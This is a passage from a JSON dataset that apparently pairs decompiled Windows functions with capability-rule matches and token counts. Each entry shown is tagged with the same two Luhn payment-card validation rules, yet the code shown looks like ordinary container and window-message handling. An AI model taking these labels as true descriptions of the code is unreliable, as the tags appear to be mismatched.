        "decompiled_code": "\nint64_t fcn.18004dab0(int64_t arg1, int64_t arg2)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    int64_t iVar5;\n    uint *puVar6;\n    uint *puVar7;\n    int64_t arg2_00;\n    \n    iVar5 = arg1;\n    fcn.18000da90(arg1, arg2);\n    uVar2 = *(arg2 + 0x24);\n    uVar3 = *(arg2 + 0x28);\n    uVar4 = *(arg2 + 0x2c);\n    *(arg1 + 0x20) = *(arg2 + 0x20);\n    *(arg1 + 0x24) = uVar2;\n    *(arg1 + 0x28) = uVar3;\n    *(arg1 + 0x2c) = uVar4;\n    *(arg1 + 0x30) = 0;\n    *(arg1 + 0x38) = 0;\n    *(arg1 + 0x40) = 0;\n    puVar7 = *(arg2 + 0x30);\n    puVar1 = *(arg2 + 0x38);\n    if (puVar7 != puVar1) {\n        arg2_00 = puVar1 - puVar7 >> 4;\n        iVar5 = fcn.18001b980(iVar5, arg2_00);\n        *(arg1 + 0x30) = iVar5;\n        *(arg1 + 0x38) = iVar5;\n        *(arg1 + 0x40) = arg2_00 * 0x10 + iVar5;\n        puVar6 = *(arg1 + 0x30);\n        do {\n            uVar2 = puVar7[1];\n            uVar3 = puVar7[2];\n            uVar4 = puVar7[3];\n            *puVar6 = *puVar7;\n            puVar6[1] = uVar2;\n            puVar6[2] = uVar3;\n            puVar6[3] = uVar4;\n            puVar6 = puVar6 + 4;\n            puVar7 = puVar7 + 4;\n        } while (puVar7 != puVar1);\n        *(arg1 + 0x38) = puVar6;\n    }\n    return arg1;\n}\n",
        "token_count": 538
    },
    "18005010": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong fcn.180050100(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    ulong uVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    \n    iVar4 = (**0x1800de7f0)(*(arg1 + 0xb8), 0x188, 0, 0);\n    if (iVar4 == -1) {\n        return 0;\n    }\n    iVar1 = *(arg1 + 200) + iVar4 * 0x48;\n    iVar5 = (**0x1800de730)(*(arg1 + 0x18), 0x2409, 0x18e, 0, 0);\n    iVar2 = *(iVar1 + 0x38);\n    iVar3 = *(iVar1 + 0x30);\n    iVar4 = (**0x1800de780)(arg3);\n    if (*(arg1 + 0x40) != 0) {\n        (**0x1800de0a8)();\n    }\n    iVar8 = iVar2 - iVar3 >> 4;\n    if (iVar4 - 0x2454U < 0x1d) {\n        iVar5 = (iVar4 - 0x2454U) + iVar5;\n        if (iVar5 < iVar8) {\n            uVar6 = *(*(iVar1 + 0x30) + iVar5 * 0x10);\n            uVar9 = uVar6 & 0xff00 | (uVar6 >> 0x10 & 0xffU) << 0x10;\n            uVar6 = uVar6 & 0xff;\n            goto code_r0x0001800501fa;\n        }\n        if (iVar5 != iVar8) {\n            return 0;\n        }\n        uVar6 = *(iVar1 + 0x20);\n    }\n    else {\n        if (0x1c < iVar4 - 0x2486U) {\n            return 0;\n        }\n        iVar5 = (iVar4 - 0x2486U) + iVar5;\n        if (iVar5 < iVar8) {\n            uVar6 = *(*(iVar1 + 0x30) + 4 + iVar5 * 0x10);\n            uVar9 = uVar6 & 0xff00 | (uVar6 >> 0x10 & 0xffU) << 0x10;\n            uVar6 = uVar6 & 0xff;\n            goto code_r0x0001800501fa;\n        }\n        if (iVar5 != iVar8) {\n            return 0;\n        }\n        uVar6 = *(iVar1 + 0x24);\n    }\n    uVar9 = uVar6 & 0xff00 | (uVar6 >> 0x10 & 0xffU) << 0x10;\n    uVar6 = uVar6 & 0xff;\ncode_r0x0001800501fa:\n    (**0x1800de0a0)(arg2, uVar9 | uVar6);\n    uVar7 = (**0x1800de0b0)(uVar9 | uVar6);\n    *(arg1 + 0x40) = uVar7;\n    return uVar7;\n}\n",
        "token_count": 754
    },
    "18005028": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180050280(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    ulong uVar4;\n    ulong var_32h;\n    \n    iVar2 = (**0x1800de7f0)(*(arg1 + 0xb8), 0x188, 0, 0);\n    if (iVar2 != -1) {\n        uVar3 = (**0x1800de730)(*(arg1 + 0x18), 0x2409, 0x18e, 0, 0);\n        *(arg1 + 0xb0) = uVar3;\n        if (arg2 <= arg3) {\n            iVar2 = arg2 + 0x2486;\n            do {\n                uVar4 = (**0x1800de798)(*(arg1 + 0x18), iVar2 + -0x32);\n                (**0x1800de718)(uVar4);\n                fcn.180068540();\n                uVar4 = (**0x1800de798)(*(arg1 + 0x18));\n                (**0x1800de718)(uVar4);\n                fcn.180068540();\n                iVar1 = iVar2 + -0x2485;\n                iVar2 = iVar2 + 1;\n            } while (iVar1 <= arg3);\n        }\n    }\n    return;\n}\n",
        "token_count": 317
    },
    "180051e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t fcn.180051e80(int64_t *arg1, int64_t arg2, ulong arg3)\n\n{\n    uint64_t arg3_00;\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint64_t arg4;\n    \n    iVar3 = *arg1;\n    iVar5 = (arg2 - iVar3) / 0x12 + (arg2 - iVar3 >> 0x3f);\n    iVar6 = (arg1[1] - iVar3) / 0x48;\n    if (iVar6 == 0x38e38e38e38e38e) {\n        fcn.180014900();\n        pcVar1 = swi(3);\n        iVar3 = (*pcVar1)();\n        return iVar3;\n    }\n    arg3_00 = iVar6 + 1;\n    uVar2 = (arg1[2] - iVar3) / 0x48;\n    arg4 = arg3_00;\n    if ((uVar2 <= 0x38e38e38e38e38e - (uVar2 >> 1)) && (arg4 = (uVar2 >> 1) + uVar2,  arg4 < arg3_00)) {\n        arg4 = arg3_00;\n    }\n    uVar2 = arg4 * 0x48;\n    if (arg4 < 0x38e38e38e38e38f) {\n        if (uVar2 < 0x1000) {\n            if (uVar2 == 0) {\n                uVar2 = 0;\n            }\n            else {\n                uVar2 = fcn.18008fb2c(uVar2);\n            }\n            goto code_r0x000180051fb6;\n        }\n    }\n    else {\n        uVar2 = 0xffffffffffffffff;\n    }\n    uVar4 = uVar2 + 0x27;\n    if (uVar4 <= uVar2) {\n        uVar4 = 0xffffffffffffffff;\n    }\n    iVar3 = fcn.18008fb2c(uVar4);\n    if (iVar3 == 0) {\n        fcn.1800b3528();\n        pcVar1 = swi(3);\n        iVar3 = (*pcVar1)();\n        return iVar3;\n    }\n    uVar2 = iVar3 + 0x27U & 0xffffffffffffffe0;\n    *(uVar2 - 8) = iVar3;\ncode_r0x000180051fb6:\n    iVar3 = uVar2 + ((iVar5 >> 2) - (iVar5 >> 0x3f)) * 0x48;\n    fcn.18004dab0(iVar3, arg3);\n    iVar6 = arg1[1];\n    iVar5 = *arg1;\n    uVar4 = uVar2;\n    if (arg2 != iVar6) {\n        fcn.180052580(*arg1, arg2, uVar2);\n        iVar6 = arg1[1];\n        iVar5 = arg2;\n        uVar4 = iVar3 + 0x48;\n    }\n    fcn.180052580(iVar5, iVar6, uVar4);\n    fcn.1800521c0(arg1, uVar2, arg3_00, arg4);\n    return iVar3;\n}\n",
        "token_count": 760
    },
    "1800619e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h_2\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_bp_30h\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800619e0(int64_t arg1, int64_t **arg2)\n\n{\n    uint32_t *puVar1;\n    char cVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    code *pcVar5;\n    uint32_t *puVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    int64_t *piVar9;\n    uchar *puVar10;\n    ulong *puVar11;\n    uint64_t uVar12;\n    int64_t *piVar13;\n    uint64_t uVar14;\n    uint32_t *puVar15;\n    uint32_t uVar16;\n    uint64_t uVar17;\n    uint64_t uVar18;\n    int64_t **arg3;\n    uint32_t uVar19;\n    uint64_t uVar20;\n    ulong var_10h;\n    ulong var_90h;\n    ulong var_98h;\n    ulong var_a0h;\n    ulong var_b0h;\n    ulong var_b8h;\n    ulong var_c0h;\n    ulong var_c8h;\n    ulong var_d0h;\n    ulong var_d8h;\n    ulong var_e8h;\n    ulong var_f0h;\n    ulong var_f8h;\n    ulong var_108h;\n    ulong var_110h;\n    ulong var_118h;\n    ulong var_120h;\n    ulong var_128h;\n    ulong var_130h;\n    ulong var_140h;\n    ulong var_148h;\n    ulong var_150h;\n    ulong var_158h;\n    ulong var_160h;\n    ulong var_168h;\n    ulong var_170h;\n    uchar auStack696 [32];\n    uchar *puStack664;\n    uchar *puStack656;\n    char cStack648;\n    ulong uStack640;\n    ulong *puStack632;\n    code *pcStack624;\n    ulong *puStack616;\n    int64_t iStack608;\n    uint64_t uStack600;\n    uchar uStack592;\n    unkbyte7 Stack591;\n    uint uStack576;\n    uint uStack572;\n    uint uStack568;\n    uint uStack564;\n    uint64_t uStack560;\n    ulong auStack552 [2];\n    ulong uStack536;\n    ulong uStack528;\n    uchar uStack520;\n    unkbyte7 Stack519;\n    uint uStack504;\n    uint uStack500;\n    uint uStack496;\n    uint uStack492;\n    ulong uStack488;\n    uchar uStack480;\n    ushort uStack472;\n    uint uStack456;\n    uint uStack452;\n    uint uStack448;\n    uint uStack444;\n    ulong auStack440 [2];\n    uchar auStack424 [128];\n    int32_t aiStack296 [2];\n    int64_t **ppiStack288;\n    uchar uStack280;\n    unkbyte7 Stack279;\n    int64_t iStack264;\n    uint64_t uStack256;\n    uint uStack248;\n    uint uStack244;\n    uint32_t *puStack240;\n    uint32_t *puStack232;\n    uint32_t uStack224;\n    uint32_t uStack220;\n    uint32_t uStack216;\n    uint32_t uStack212;\n    uint64_t uStack208;\n    uint64_t uStack200;\n    uchar uStack192;\n    unkbyte7 Stack191;\n    ulong uStack176;\n    uint64_t uStack168;\n    uchar auStack160 [16];\n    ulong uStack144;\n    ulong var_80h;\n    ulong var_bp_78h;\n    ulong var_70h;\n    uint64_t uStack112;\n    ulong *var_bp_60h;\n    ulong *var_bp_58h;\n    ulong var_bp_50h;\n    uint64_t uStack80;\n    uint64_t var_40h;\n    ulong var_bp_38h;\n    ulong var_bp_30h;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_10h_2;\n    \n    auStack440[0] = 0xfffffffffffffffe;\n    var_40h = *0x180123080 ^ auStack696;\n    iStack608 = arg1;\n    ppiStack288 = arg2;\n    cVar2 = fcn.1800607a0(arg1);\n    if (cVar2 != '\\0') {\n        if (0xf < arg2[3]) {\n            piVar13 = *arg2;\n            piVar9 = piVar13;\n            if ((0xfff < arg2[3] + 1U) && (piVar9 = piVar13[-1],  0x1f < piVar13 + (-8 - piVar9))) {\ncode_r0x0001800626bf:\n                fcn.1800b3528();\n                goto code_r0x0001800626c5;\n            }\n            fcn.18008fb24(piVar9);\n        }\n        *arg2 = 0;\ncode_r0x000180061b52:\n        arg2[3] = 0xf;\n        arg2[2] = NULL;\n        fcn.18008fb00(var_40h ^ auStack696);\n        return;\n    }\n    uVar20 = 0;\n    iStack264 = 0;\n    uStack256 = 0xf;\n    uStack280 = 0;\n    fcn.1800602c0(arg1, &uStack280);\n    if (iStack264 == 0) {\ncode_r0x000180061ab7:\n        if (0xf < uStack256) {\n            iVar8 = CONCAT71(Stack279, uStack280);\n            iVar7 = iVar8;\n            if ((0xfff < uStack256 + 1) && (iVar7 = *(iVar8 + -8),  0x1f < (iVar8 - *(iVar8 + -8)) - 8U)) {\ncode_r0x0001800626b9:\n                fcn.1800b3528();\n                goto code_r0x0001800626bf;\n            }\ncode_r0x000180061af3:\n            fcn.18008fb24(iVar7);\n        }\ncode_r0x000180061af8:\n        iStack264 = 0;\n        uStack256 = 0xf;\n        uStack280 = 0;\n        if (0xf < arg2[3]) {\n            piVar13 = *arg2;\n            piVar9 = piVar13;\n            if ((0xfff < arg2[3] + 1U) && (piVar9 = piVar13[-1],  0x1f < piVar13 + (-8 - piVar9)))\n            goto code_r0x0001800626bf;\n            fcn.18008fb24(piVar9);\n        }\n        *arg2 = 0;\n        goto code_r0x000180061b52;\n    }\n    if (arg2[2] == NULL) {\n        uVar4 = fcn.180060610(arg1, &uStack592);\n        fcn.18000dd60(arg2, uVar4);\n        if (CONCAT44(uStack564, uStack568) < 0x10) {\ncode_r0x000180061be8:\n            if (arg2[2] == NULL) goto code_r0x000180061ab7;\n            goto code_r0x000180061bf6;\n        }\n        iVar8 = CONCAT71(Stack591, uStack592);\n        iVar7 = iVar8;\n        if ((CONCAT44(uStack564, uStack568) + 1 < 0x1000) || (iVar7 = *(iVar8 + -8),  (iVar8 - iVar7) - 8U < 0x20)) {\n            fcn.18008fb24(iVar7);\n            goto code_r0x000180061be8;\n        }\ncode_r0x0001800626c5:\n        fcn.1800b3528();\ncode_r0x0001800626cb:\n        fcn.1800b3528();\ncode_r0x0001800626d1:\n        fcn.1800b3528();\n    }\n    else {\ncode_r0x000180061bf6:\n        auStack160 = ZEXT816(0);\n        uStack144 = 0;\n        puStack616 = &var_bp_60h;\n        var_bp_50h = 0;\n        uStack80 = 7;\n        var_bp_60h = var_bp_60h & 0xffffffffffff0000;\n        fcn.180010d70(&var_bp_60h, 0x1800fa034, 0);\n        uVar4 = fcn.1800687b0(auStack424);\n        arg3 = arg2;\n        if (0xf < arg2[3]) {\n            arg3 = *arg2;\n        }\n        fcn.180069050(uVar4, &uStack592, arg3, arg2[2] + arg3);\n        puVar10 = auStack424;\n        fcn.1800686c0(puVar10);\n        fcn.180006aa0(puVar10, &uStack592, auStack160, &var_bp_60h);\n        aiStack296[0] = -1;\n        (**0x1800de7f0)(*0x18012a390, 0x7ec, 0, aiStack296);\n        if (aiStack296[0] < 0) {\ncode_r0x000180062661:\n            fcn.1800631d0(auStack160);\n            if (0xf < uStack256) {\n                iVar8 = CONCAT71(Stack279, uStack280);\n                iVar7 = iVar8;\n                if ((uStack256 + 1 < 0x1000) || (iVar7 = *(iVar8 + -8),  (iVar8 - iVar7) - 8U < 0x20))\n                goto code_r0x000180061af3;\n                goto code_r0x0001800626b9;\n            }\n            goto code_r0x000180061af8;\n        }\n        iVar7 = *0x18012a398;\n        if (aiStack296[0] != 0) {\n            iVar7 = *0x18012a3a0;\n        }\n        if (iVar7 == 0) goto code_r0x000180062661;\n        pcVar5 = (**0x1800de7f0)(iVar7, 0x888, 0, 0);\n        pcStack624 = pcVar5;\n        uStack640 = (**0x1800de7f0)(iVar7, 0x889, 0, 0);\n        uStack600 = (*(arg1 + 0x168) - *(arg1 + 0x160)) / 0xe8;\n        uStack176 = 0;\n        uStack168 = 0xf;\n        uStack192 = 0;\n        fcn.180010fa0(&uStack192, 0x7fff);\n        var_70h = CONCAT44(*0x180101914, *0x180101910);\n        uStack112 = CONCAT44(*0x18010191c, *0x180101918);\n        var_80h._0_1_ = 0;\n        uStack208 = 0;\n        uStack200 = 0xf;\n        uStack224 = uStack224 & 0xffffff00;\n        cStack648 = '\\x01';\n        uStack248 = 0;\n        uStack244 = 0;\n        puStack240 = NULL;\n        puStack232 = NULL;\n        uStack488 = 0;\n        uStack480 = 0;\n        uStack456 = *0x180101900;\n        uStack452 = *0x180101904;\n        uStack448 = *0x180101908;\n        uStack444 = *0x18010190c;\n        uStack472 = 0;\n        var_bp_60h = &uStack488;\n        var_bp_58h = auStack440;\n        fcn.180063000(&uStack248, &var_bp_60h);\n        fcn.18008ff90(&uStack488, 0x30, 1, 0x180015000);\n        puStack616 = auStack552;\n        uStack536 = 0;\n        uStack528 = 0xf;\n        auStack552[0]._0_1_ = 0;\n        fcn.180011120(auStack552, 0x1800f4c0e, 0);\n        uStack504 = *0x180101910;\n        uStack500 = *0x180101914;\n        uStack496 = *0x180101918;\n        uStack492 = *0x18010191c;\n        uStack520 = 0;\n        fcn.180011120(&uStack520, 0x1800f4c0f, 0);\n        var_bp_50h = CONCAT44(*0x180101914, *0x180101910);\n        uStack80 = CONCAT44(*0x18010191c, *0x180101918);\n        var_bp_60h = var_bp_60h & 0xffffffffffffff00;\n        puVar11 = &var_bp_60h;\n        fcn.180011120(puVar11, \"RecordTerminator\", 0x10);\n        puStack656 = auStack552;\n        puStack664 = &uStack520;\n        puVar6 = fcn.180004b90(puVar11, &uStack592, &uStack280, &var_bp_60h);\n        if (&uStack224 != puVar6) {\n            if (uStack200 < 0x10) {\ncode_r0x000180061f1a:\n                uStack224 = *puVar6;\n                uStack220 = puVar6[1];\n                uStack216 = puVar6[2];\n                uStack212 = puVar6[3];\n                uStack208 = *(puVar6 + 4);\n                uStack200 = *(puVar6 + 6);\n                *(puVar6 + 4) = 0;\n                *(puVar6 + 6) = 0xf;\n                *puVar6 = 0;\n                goto code_r0x000180061f57;\n            }\n            iVar8 = CONCAT44(uStack220, uStack224);\n            iVar7 = iVar8;\n            if ((uStack200 + 1 < 0x1000) || (iVar7 = *(iVar8 + -8),  (iVar8 - iVar7) - 8U < 0x20)) {\n                fcn.18008fb24(iVar7);\n                goto code_r0x000180061f1a;\n            }\n            goto code_r0x0001800626cb;\n        }\ncode_r0x000180061f57:\n        if (0xf < CONCAT44(uStack564, uStack568)) {\n            iVar8 = CONCAT71(Stack591, uStack592);\n            iVar7 = iVar8;\n            if ((0xfff < CONCAT44(uStack564, uStack568) + 1) && (iVar7 = *(iVar8 + -8),  0x1f < (iVar8 - iVar7) - 8U))\n            goto code_r0x0001800626cb;\n            fcn.18008fb24(iVar7);\n        }\n        uStack576 = *0x180101910;\n        uStack572 = *0x180101914;\n        uStack568 = *0x180101918;\n        uStack564 = *0x18010191c;\n        uStack592 = 0;\n        if (0xf < uStack80) {\n            uVar12 = var_bp_60h;\n            if ((uStack80 + 1 < 0x1000) || (uVar12 = *(var_bp_60h - 8),  (var_bp_60h - uVar12) - 8 < 0x20)) {\n                fcn.18008fb24(uVar12);\n                goto code_r0x000180061fe7;\n            }\n            goto code_r0x0001800626d1;\n        }\ncode_r0x000180061fe7:\n        var_bp_50h = CONCAT44(*0x180101914, *0x180101910);\n        uStack80 = CONCAT44(*0x18010191c, *0x180101918);\n        var_bp_60h = var_bp_60h & 0xffffffffffffff00;\n        if (CONCAT44(uStack492, uStack496) < 0x10) {\ncode_r0x000180062039:\n            uStack560 = uStack208;\n            uVar4 = (**0x1800de748)(0, 0x7f02);\n            (**0x1800de750)(uVar4);\n            uVar4 = uStack640;\n            puStack616 = (*pcVar5)(uStack640, 0x86a, 0, 0);\n            puStack632 = NULL;\n            uVar12 = uVar20;\n            if (puStack616 != NULL) {\ncode_r0x000180062090:\n                uVar19 = uVar12;\n                iVar7 = (*pcVar5)(uVar4, 0x92e, puStack632, 0);\n                puVar11 = puStack632;\n                if (0x7fff < iVar7) goto code_r0x0001800624eb;\n                (*pcVar5)(uVar4, 0x869, puStack632);\n                iVar7 = (*pcVar5)(uVar4, 0x877, puVar11);\n                iVar8 = (*pcVar5)(uStack640, 0x858, puVar11);\n                puVar10 = &uStack192;\n                if (0xf < uStack168) {\n                    puVar10 = CONCAT71(Stack191, uStack192);\n                }\n                uVar17 = iVar8 - iVar7;\n                if ((cStack648 != '\\0') &&\n                   (fcn.180011120(&var_80h, puVar10, uVar17),  uVar4 = uStack640,  pcVar5 = pcStack624,  uVar17 == 0))\n                goto code_r0x0001800624eb;\n                if (uStack560 == 0) {\ncode_r0x00018006219d:\n                    uVar17 = uStack600;\n                    cStack648 = '\\x01';\n                    uVar14 = uVar20;\n                    uVar18 = uVar20;\n                    if (uStack600 != 0) {\n                        do {\n                            cVar2 = fcn.18003c420(&var_80h, *(iStack608 + 0x160) + 0x40 + uVar14);\n                            puVar6 = puStack240;\n                            if (cVar2 != '\\0') {\n                                puVar15 = puStack240 + -0xc;\n                                uVar16 = uVar18 + 1;\n                                fcn.180020a90(&var_bp_60h, 7, L\"REC%03d\", uVar16);\n                                iVar7 = auStack160._8_8_ - auStack160._0_8_ >> 0x3f;\n                                iVar8 = (auStack160._8_8_ - auStack160._0_8_) / 0x30 + iVar7;\n                                uVar17 = uVar20;\n                                if (iVar8 != iVar7) goto code_r0x000180062272;\n                                goto code_r0x000180062286;\n                            }\n                            uVar18 = uVar18 + 1;\n                            uVar14 = uVar14 + 0xe8;\n                        } while (uVar18 < uVar17);\n                    }\n                    goto code_r0x0001800621f2;\n                }\n                if (uStack560 < uVar17) {\n                    puVar6 = &uStack224;\n                    if (0xf < uStack200) {\n                        puVar6 = CONCAT44(uStack220, uStack224);\n                    }\n                    if (uVar17 < uVar17 - uStack560) {\n                        fcn.18003c220();\n                        goto code_r0x0001800626ef;\n                    }\n                    uVar14 = 0xffffffffffffffff;\n                    if (uStack560 != 0xffffffffffffffff) {\n                        uVar14 = uStack560;\n                    }\n                    if ((uVar14 == uStack208) &&\n                       (iVar3 = fcn.1800ae4d0(puVar10 + (uVar17 - uStack560), puVar6, uVar14),  iVar3 == 0))\n                    goto code_r0x00018006219d;\n                }\n                cStack648 = '\\0';\n                uVar4 = uStack640;\n                pcVar5 = pcStack624;\n                goto code_r0x0001800624eb;\n            }\ncode_r0x000180062508:\n            uVar4 = (**0x1800de748)(0, 0x7f00);\n            (**0x1800de750)(uVar4);\n            fcn.180062700(arg1);\n            fcn.180060e80(arg1);\n            fcn.1800631d0(&uStack248);\n            if (0xf < uStack200) {\n                iVar8 = CONCAT44(uStack220, uStack224);\n                iVar7 = iVar8;\n                if ((0xfff < uStack200 + 1) && (iVar7 = *(iVar8 + -8),  0x1f < (iVar8 - iVar7) - 8U))\n                goto code_r0x0001800626dd;\n                fcn.18008fb24(iVar7);\n            }\n            uStack208 = 0;\n            uStack200 = 0xf;\n            uStack224 = uStack224 & 0xffffff00;\n            if (0xf < uStack112) {\n                iVar8 = CONCAT71(var_80h._1_7_, var_80h);\n                iVar7 = iVar8;\n                if ((0xfff < uStack112 + 1) && (iVar7 = *(iVar8 + -8),  0x1f < (iVar8 - iVar7) - 8U)) {\ncode_r0x0001800626ef:\n                    fcn.1800b3528();\n                    pcVar5 = swi(3);\n                    (*pcVar5)();\n                    return;\n                }\n                fcn.18008fb24(iVar7);\n            }\n            var_70h = CONCAT44(*0x180101914, *0x180101910);\n            uStack112 = CONCAT44(*0x18010191c, *0x180101918);\n            var_80h._0_1_ = 0;\n            if (uStack168 < 0x10) {\ncode_r0x000180062637:\n                uStack176 = 0;\n                uStack168 = 0xf;\n                uStack192 = 0;\n                fcn.1800631d0(auStack160);\n                goto code_r0x000180061ab7;\n            }\n            iVar8 = CONCAT71(Stack191, uStack192);\n            iVar7 = iVar8;\n            if (uStack168 + 1 < 0x1000) {\ncode_r0x000180062632:\n                fcn.18008fb24(iVar7);\n                goto code_r0x000180062637;\n            }\n            iVar7 = *(iVar8 + -8);\n            if ((iVar8 - iVar7) - 8U < 0x20) goto code_r0x000180062632;\n            fcn.1800b3528(var_70h, iVar7, uStack168 + 0x28);\n            goto code_r0x0001800626b9;\n        }\n        iVar8 = CONCAT71(Stack519, uStack520);\n        iVar7 = iVar8;\n        if ((CONCAT44(uStack492, uStack496) + 1 < 0x1000) || (iVar7 = *(iVar8 + -8),  (iVar8 - iVar7) - 8U < 0x20)) {\n            fcn.18008fb24(iVar7);\n            goto code_r0x000180062039;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x0001800626dd:\n    fcn.1800b3528();\ncode_r0x0001800626e3:\n    fcn.1800b3528();\n    pcVar5 = swi(3);\n    (*pcVar5)();\n    return;\n    while( true ) {\n        uVar17 = uVar17 + 1;\n        auStack160._0_8_ = auStack160._0_8_ + 0xc;\n        if (iVar8 - iVar7 <= uVar17) break;\ncode_r0x000180062272:\n        puVar1 = puStack240;\n        if (uVar16 == *auStack160._0_8_) goto joined_r0x00018006236f;\n    }\ncode_r0x000180062286:\n    if ((0 < uVar19) && (*(puVar6 + -4) != 0)) {\n        piVar13 = puVar6 + -8;\n        puStack664 = 0xffffffffffffffff;\n        do {\n            puStack664 = puStack664 + 1;\n        } while (*(&var_bp_60h + puStack664 * 2) != 0);\n        if (7 < *(puVar6 + -2)) {\n            piVar13 = *piVar13;\n        }\n        iVar7 = fcn.180013460(piVar13, *(puVar6 + -4), 0, &var_bp_60h);\n        puVar6 = puStack240;\n        if (iVar7 != -1) {\n            if (7 < *(puStack240 + -2)) {\n                iVar7 = *(puStack240 + -8);\n                iVar8 = iVar7;\n                if ((0xfff < *(puStack240 + -2) * 2 + 2) && (iVar8 = *(iVar7 + -8),  0x1f < (iVar7 - iVar8) - 8U))\n                goto code_r0x0001800626e3;\n                fcn.18008fb24(iVar8);\n            }\n            pcVar5 = pcStack624;\n            uVar4 = uStack640;\n            *(puVar6 + -4) = 0;\n            *(puVar6 + -2) = 7;\n            *(puVar6 + -8) = 0;\n            puStack240 = puStack240 + -0xc;\n            uVar12 = uVar19 - 1;\n            (*pcStack624)(uStack640, 0x8ae, puStack632);\n            goto code_r0x0001800624eb;\n        }\n    }\ncode_r0x0001800621f2:\n    pcVar5 = pcStack624;\n    uVar4 = uStack640;\n    (*pcStack624)(uStack640, 0x8ae, puStack632);\n    goto code_r0x0001800624eb;\n    while( true ) {\n        uVar19 = uVar12;\n        if ((puVar15[1] <= auStack160._0_8_[1]) &&\n           ((puVar15[1] != auStack160._0_8_[1] || (*(auStack160._0_8_ + 2) != '\\0')))) {\n            if (*(puVar15 + 8) == 0) break;\n            piVar13 = puVar15 + 4;\n            puStack664 = 0xffffffffffffffff;\n            do {\n                puStack664 = puStack664 + 1;\n            } while (*(&var_bp_60h + puStack664 * 2) != 0);\n            if (7 < *(puVar15 + 10)) {\n                piVar13 = *piVar13;\n            }\n            iVar7 = fcn.180013460(piVar13, *(puVar15 + 8), 0, &var_bp_60h);\n            if (iVar7 == -1) break;\n        }\n        if (7 < *(puVar1 + -2)) {\n            iVar7 = *(puVar1 + -8);\n            iVar8 = iVar7;\n            if ((0xfff < *(puVar1 + -2) * 2 + 2) && (iVar8 = *(iVar7 + -8),  0x1f < (iVar7 - iVar8) - 8U))\n            goto code_r0x0001800626e3;\n            fcn.18008fb24(iVar8);\n        }\n        *(puVar1 + -4) = 0;\n        *(puVar1 + -2) = 7;\n        *(puVar1 + -8) = 0;\n        puVar1 = puStack240 + -0xc;\n        puVar15 = puStack240 + -0x18;\n        uVar19 = uVar19 - 1;\n        uVar12 = uVar19;\n        if ((*(puStack240 + -0x16) != '\\0') &&\n           (puVar6 = puStack240 + -0x17,  puStack240 = puVar1, \n           *puVar6 == auStack160._0_8_[1] || *puVar6 < auStack160._0_8_[1])) break;\njoined_r0x00018006236f:\n        puStack240 = puVar1;\n        if (uVar19 < 1) break;\n    }\n    pcVar5 = pcStack624;\n    uVar4 = uStack640;\n    (*pcStack624)(uStack640, 0x8ae, puStack632);\n    if (puStack240 == puStack232) {\n        fcn.180063bc0(&uStack248, puStack240, auStack160._0_8_);\n        uVar12 = uVar19 + 1;\n    }\n    else {\n        *puStack240 = *auStack160._0_8_;\n        puStack240[1] = auStack160._0_8_[1];\n        *(puStack240 + 2) = *(auStack160._0_8_ + 2);\n        fcn.18000da90(puStack240 + 4, auStack160._0_8_ + 4);\n        puStack240 = puStack240 + 0xc;\n        uVar12 = uVar19 + 1;\n    }\ncode_r0x0001800624eb:\n    puStack632 = puStack632 + 1;\n    arg1 = iStack608;\n    if (puStack616 <= puStack632) goto code_r0x000180062508;\n    goto code_r0x000180062090;\n}\n",
        "token_count": 6844
    },
    "18006270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
